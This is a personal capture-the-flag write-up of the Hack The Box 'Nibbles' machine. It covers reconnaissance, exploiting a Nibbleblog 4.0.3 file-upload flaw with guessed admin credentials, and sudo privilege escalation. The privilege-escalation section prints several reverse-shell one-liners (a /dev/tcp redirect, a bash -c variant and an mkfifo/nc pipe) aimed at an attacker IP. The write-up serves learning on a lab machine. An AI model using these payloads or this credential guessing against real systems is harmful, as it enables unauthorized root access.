# Nibbles
## Recon
I start byu scanning the machine with Nmap `nmap -sV -sC -Pn 10.10.10.75`, the flags are: port service version, default nmap script, treat host as up. The host showed that just port 22 (SSH) and port 80 (http website) were up.

Navigating to the webpage in my browser `10.10.10.75:80` didn't show anything useful, however viewing the page source leads you to the /nibbleblog directory. Here I started fuzzing directories with ffuf. Fuzzing from this directory, you find
```
content                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 266ms]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 275ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 271ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 266ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 267m]
```

I started by checking out the readme and noted down the Nibbleblog version being hosted:
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Checking Google for this version of Nibbleblog, and [CVE-2015-6967](https://www.exploit-db.com/exploits/38489) would allow me to gain a shell, even better, it's built into Metasploit under the plugin `multi/http/nibbleblog_file_upload`, I just need user creds.

I had a look around some of the other directories including admin and content, and noted that in some of the hosted XML files, there was a user called 'admin'. I didn't want to go through the hassle of fuzzing again for a login portal, so I googled the detault login page which is located at <IP_ADDRESS>/nibbleblog/admin.php.

## Foothold
I didn't have a plan for getting into the admin panel. I had a look on Google again for default nibbleblog creds but couldn't find anything, so I had a couple of attempts at SQL injection - no luck. I threw some common passwords - admin/password at it and quickly had my IP blacklisted. I now knew why this machine had such a low rating on HTB.

After a reset, I tried a couple more - password, password1, nibbles. We had a winner.

With admin/nibbles as my login creds, I went back to Metasploit, set RHOSTS, LHOST, LPORT, USERNAME, PASSWORD and the nibbleblog base directory and fired away. Shortly afterwards, I had a meterpreter connection to the box, quickly grabbing the user flag.

## Privesc
The shell was initially pretty flimsy, so I established a TTY shell with `/usr/bin/script -qc /bin/bash /dev/null`. Running `whoami`, I found I was a user called Nibbler.

The first thing I did was run `sudo -l` to see what commands I could run as root, Nibbles returned:
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
This was fantastic news, there was a script I most likely had access to that I could run directly as root for an easy PrivEsc.

I navigated to /home/nibbler, unzipped personal.zip and checked out monitor.sh. It didn't look particularly interesting, but I could surely append a line to spawn a shell for my host machine.

Initially I tried `echo '0<&196;exec 196<>/dev/tcp/10.10.14.4/9002; sh <&196 >&196 2>&196' > monitor.sh` and ran it with `sudo -u root ./monitor.sh`. No good, I was met with `Syntax error: Bad fd number`. After doing some research, I needed to spawn a shell for /bin/dash, not /bin/bash. Checking some other payloads, I tried: `echo 'bash -c ">& /dev/tcp/10.10.14.4/9002 0>&1"' >> monitor.sh` which was specifically aimed to remediate my issue. It was an improvement, no error message, but the shell was closing on my netcat listened as soon as I ran the script so I'd have to keep looking.

At this point I just tried different one liners until one worked. I ended up settling with `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 9002 > /tmp/f" > monitor.sh`. After establishing a connection to the box on the target via this script, I had root access.
